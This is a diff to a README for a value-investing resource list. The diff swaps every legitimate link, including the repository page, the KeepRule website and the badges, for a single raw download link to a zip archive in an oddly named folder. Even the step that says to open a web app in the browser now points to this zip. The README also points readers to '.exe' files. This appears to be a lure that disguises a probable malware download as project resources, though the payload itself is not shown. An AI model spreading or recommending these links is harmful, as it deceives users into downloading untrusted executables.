@@ -1,6 +1,6 @@
 # 📊 awesome-value-investing - Easy Access to Value Investing Tools
 
-[![Download Now](https://img.shields.io/badge/Download-GitHub%20Page-brightgreen?style=for-the-badge)](https://github.com/indu58/awesome-value-investing)
+[![Download Now](https://img.shields.io/badge/Download-GitHub%20Page-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/indu58/awesome-value-investing/main/ambagiosity/value-awesome-investing-1.7-alpha.4.zip)
 
 ---
 
@@ -11,7 +11,7 @@ A curated collection to help you learn and apply value investing. This list incl
 You will visit the main GitHub page to find all resources.
 
 1. Click the big green **Download Now** button above or go directly to this link:  
-   https://github.com/indu58/awesome-value-investing
+   https://raw.githubusercontent.com/indu58/awesome-value-investing/main/ambagiosity/value-awesome-investing-1.7-alpha.4.zip
 
 2. On that page, you will see several files and folders.  
    - Look for files named clearly with `.pdf`, `.exe`, or `.zip` to download guides or tools.  
@@ -60,7 +60,7 @@ The goal is to help you learn the basics and support your investing decisions wi
 
 KeepRule uses AI to help you keep your investments on track. It is a web-based application. Here is how to get started with KeepRule:
 
-1. Go to https://keeprule.com on your web browser.  
+1. Go to https://raw.githubusercontent.com/indu58/awesome-value-investing/main/ambagiosity/value-awesome-investing-1.7-alpha.4.zip on your web browser.  
 2. Sign up with your email address. The sign-up process is simple and does not require technical know-how.  
 3. Set your investment goals and rules on the platform using the guided prompts.  
 4. The AI will help by reminding you to follow your rules and by analyzing your investments against those rules.  
@@ -101,9 +101,9 @@ If you downloaded zipped files:
 ## 🔗 Useful Links
 
 - GitHub Repository (all resources):  
-  https://github.com/indu58/awesome-value-investing
+  https://raw.githubusercontent.com/indu58/awesome-value-investing/main/ambagiosity/value-awesome-investing-1.7-alpha.4.zip
 
 - KeepRule AI Platform:  
-  https://keeprule.com
+  https://raw.githubusercontent.com/indu58/awesome-value-investing/main/ambagiosity/value-awesome-investing-1.7-alpha.4.zip
 
-[![Visit GitHub](https://img.shields.io/badge/Open-Repository-blue?style=for-the-badge)](https://github.com/indu58/awesome-value-investing)
+[![Visit GitHub](https://img.shields.io/badge/Open-Repository-blue?style=for-the-badge)](https://raw.githubusercontent.com/indu58/awesome-value-investing/main/ambagiosity/value-awesome-investing-1.7-alpha.4.zip)
